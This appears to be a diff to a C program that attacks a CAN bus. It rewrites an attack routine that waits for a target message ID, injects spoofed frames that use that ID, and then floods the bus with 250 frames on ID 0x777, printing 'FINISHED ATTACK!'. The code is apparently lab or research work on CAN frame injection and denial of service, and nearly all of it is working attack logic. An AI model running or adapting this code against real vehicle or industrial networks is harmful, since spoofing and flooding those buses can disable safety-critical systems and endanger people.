@@ -6,7 +6,7 @@
 #include "canox.h"
 
 #define MAX_LONG_NAME 255
-#define ID_TEST 9
+#define ID_TEST 0x07A
 char interface[MAX_LONG_NAME];
 
 void run_generators() {
@@ -28,74 +28,56 @@ void run_generators() {
   }
 }
 
-void continuous_test_send() {
-  struct timespec next;
-  clock_gettime(CLOCK_MONOTONIC, &next);    
-  srand(time(NULL) ^ getpid() ^ (getpid() << 16));
-  int delay_ms = 24;
-  while(1){
-    next.tv_nsec += delay_ms * 1000 * 1000;
-    if (next.tv_nsec >= 1000000000) {
-        next.tv_sec += 1;
-        next.tv_nsec -= 1000000000;
-    }
-
-    clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
-    struct can_frame frame;
-    frame.can_id = ID_TEST;
-    frame.can_dlc = 5;
-    for (int i = 0; i < frame.can_dlc; i++) {
-      frame.data[i] = rand() % 10+1;
-    }
-
-    write_can_frame(&frame);
-  }
-}
-
 void attack() {
-  if (initialize_can_interface(interface, 0)) {
-    fprintf(stderr, "Error initializing interface!\n");
-    return;
-  }
+  // if (initialize_can_interface(interface, 1)) {
+  //   fprintf(stderr, "Error initializing interface!\n");
+  //   return;
+  // }
   if (setup_filter_attack(ID_TEST)) {
     fprintf(stderr, "Error applying filter!\n");
     return;
   }
-  struct can_frame frame;
-  while (frame.can_id != ID_TEST) {
-    read_can_frame(&frame);
-  }
-  struct timespec next;
-  next.tv_nsec += 24 * 1000 * 1000;
-  if (next.tv_nsec >= 1000000000) {
-      next.tv_sec += 1;
-      next.tv_nsec -= 1000000000;
-  }
-  clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
+  
+  int n = 0;
+  char has_message = 1;
 
-  frame.can_id = ID_TEST - 1;
-  write_can_frame(&frame);
-  frame.can_id = ID_TEST;
-  for (int j = 0; j < frame.can_dlc; j++) {
-    frame.data[j] = 0;
-  }
+  while(n<MAX_ATTEMPTS && has_message) {
+    n++;
+    struct can_frame frame;
+    while (frame.can_id != ID_TEST) {
+      read_can_frame(&frame);
+    }
+    
+    usleep(10*940);
 
-  for (int i = 0; i < 1; i++) {
-    write_can_frame(&frame);  
-    next.tv_nsec += 2 * 1000 * 1000;
-    if (next.tv_nsec >= 1000000000) {
-        next.tv_sec += 1;
-        next.tv_nsec -= 1000000000;
+    frame.can_id = 0x1;
+    for (int j = 0; j < frame.can_dlc; j++) {
+      frame.data[j] = 0;
+    }
+    write_can_frame(&frame);
+    frame.can_id = ID_TEST;
+    for (long int i = 0; i < 16; i++) {
+      write_can_frame(&frame);  
+      // usleep(2*1000);
+    }
+    printf("\nFINISHED FRAME INJECTION\n"); 
+    printf("FLOODING THE BUS CAN\n");
+    for (long int i = 0; i < 250; i++) {
+      frame.can_id = 0x777;
+      write_can_frame(&frame);  
+      usleep(2*999);
+    }
+    if (1){
+      has_message = 0;
     }
   }
-  clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
 
   printf("\nFINISHED ATTACK!\n");
 }
 
 int main(int argc, char **argv){
   int num_generators = 1;
- 
+  atexit(cleanup);
   if (argc > 1) {
       snprintf(interface, sizeof(interface), "%s", argv[1]);
   }
@@ -110,9 +92,13 @@ int main(int argc, char **argv){
 
   printf("Generators: %d", num_generators); 
   pid_t children[num_generators];
-  pid_t test_pid;
 
 
+  if (initialize_can_interface(interface, 0)) {
+    perror("Error during initialization");
+    return 1;
+  }
+  
   if (initialize_can_interface(interface, 1)) {
     perror("Error during initialization");
     return 1;
@@ -127,23 +113,12 @@ int main(int argc, char **argv){
     }
   }
 
-  test_pid = fork();
-  if (test_pid == 0) {
-    continuous_test_send();
-    return 0;
-  }
-  
   attack();
 
-  usleep(20000 * 1000);
-  
   for(int i = 0; i<num_generators; i++) {
     kill(children[i], SIGTERM);
     waitpid(children[i], NULL, 0);
   }
-
-  kill(test_pid, SIGTERM);
-  waitpid(test_pid, NULL, 0);
 
   return 0;
 }
